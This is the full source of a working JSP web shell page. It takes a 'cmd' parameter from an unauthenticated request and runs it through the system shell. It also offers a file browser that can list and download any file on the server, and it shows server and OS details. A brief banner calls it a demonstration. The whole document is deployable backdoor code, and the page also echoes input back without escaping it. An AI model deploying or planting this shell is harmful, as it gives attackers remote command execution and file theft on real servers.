<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.text.SimpleDateFormat" %>
<html>
<head>
    <title>JSP Web Shell</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .command { margin-bottom: 20px; }
        input[type="text"] { width: 80%; padding: 8px; border: 1px solid #ced4da; border-radius: 4px; }
        input[type="submit"], button { padding: 8px 15px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover, button:hover { background-color: #c82333; }
        .container { max-width: 900px; margin: 0 auto; }
        .alert { padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        .alert-danger { background-color: #f8d7da; color: #721c24; }
        .alert-success { background-color: #d4edda; color: #155724; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #dee2e6; }
        th { background-color: #f8f9fa; }
        tr:hover { background-color: #f5f5f5; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .system-info { margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>JSP Web Shell</h1>
            <div class="system-info">
                <strong>Server:</strong> <%= application.getServerInfo() %><br>
                <strong>JSP Version:</strong> <%= JspFactory.getDefaultFactory().getEngineInfo().getSpecificationVersion() %><br>
                <strong>Java Version:</strong> <%= System.getProperty("java.version") %><br>
                <strong>OS:</strong> <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> (<%= System.getProperty("os.arch") %>)
            </div>
        </div>

        <div class="alert alert-danger">
            <strong>Warning:</strong> This is a demonstration of a security vulnerability. In a real environment, this shell could be used for malicious purposes.
        </div>

        <div class="command">
            <form method="post">
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="cmd" placeholder="Enter command (e.g. 'dir' or 'ls')" value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "" %>">
                    <input type="submit" value="Execute">
                </div>
            </form>
        </div>

        <% if (request.getParameter("cmd") != null) { %>
            <h3>Command Output:</h3>
            <pre><%
                String cmd = request.getParameter("cmd");
                try {
                    Process process;
                    if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                        process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
                    } else {
                        process = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", cmd });
                    }
                    
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    
                    String line;
                    while ((line = reader.readLine()) != null) {
                        out.println(line);
                    }
                    
                    while ((line = errorReader.readLine()) != null) {
                        out.println("<span style='color:red'>" + line + "</span>");
                    }
                    
                    process.waitFor();
                } catch (Exception e) {
                    out.println("Error executing command: " + e.getMessage());
                }
            %></pre>
        <% } %>

        <h3>File Browser</h3>
        <%
            String currentPath = request.getParameter("path");
            if (currentPath == null || currentPath.isEmpty()) {
                currentPath = System.getProperty("user.dir");
            }
            
            try {
                Path path = Paths.get(currentPath);
                File currentDir = path.toFile();
                
                if (request.getParameter("download") != null) {
                    String fileToDownload = request.getParameter("download");
                    File file = new File(currentPath, fileToDownload);
                    
                    if (file.exists()) {
                        response.setContentType("application/octet-stream");
                        response.setHeader("Content-Disposition", "attachment; filename=\"" + fileToDownload + "\"");
                        
                        try (FileInputStream fileInputStream = new FileInputStream(file);
                             ServletOutputStream outputStream = response.getOutputStream()) {
                            
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            
                            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                                outputStream.write(buffer, 0, bytesRead);
                            }
                        }
                        return;
                    }
                }
                
                out.println("<p>Current directory: " + currentPath + "</p>");
                
                if (currentDir.getParent() != null) {
                    out.println("<a href='?path=" + currentDir.getParent() + "'>[Parent Directory]</a>");
                }
                
                out.println("<table>");
                out.println("<tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr>");
                
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                
                File[] files = currentDir.listFiles();
                if (files != null) {
                    Arrays.sort(files);
                    
                    for (File file : files) {
                        out.println("<tr>");
                        if (file.isDirectory()) {
                            out.println("<td><a href='?path=" + file.getAbsolutePath() + "'>" + file.getName() + "/</a></td>");
                            out.println("<td>Directory</td>");
                        } else {
                            out.println("<td>" + file.getName() + "</td>");
                            out.println("<td>" + (file.length() / 1024) + " KB</td>");
                        }
                        out.println("<td>" + sdf.format(new Date(file.lastModified())) + "</td>");
                        out.println("<td>");
                        if (!file.isDirectory()) {
                            out.println("<a href='?path=" + currentPath + "&download=" + file.getName() + "'>Download</a>");
                        }
                        out.println("</td>");
                        out.println("</tr>");
                    }
                }
                out.println("</table>");
                
            } catch (Exception e) {
                out.println("<div class='alert alert-danger'>Error: " + e.getMessage() + "</div>");
            }
        %>
    </div>
</body>
</html> 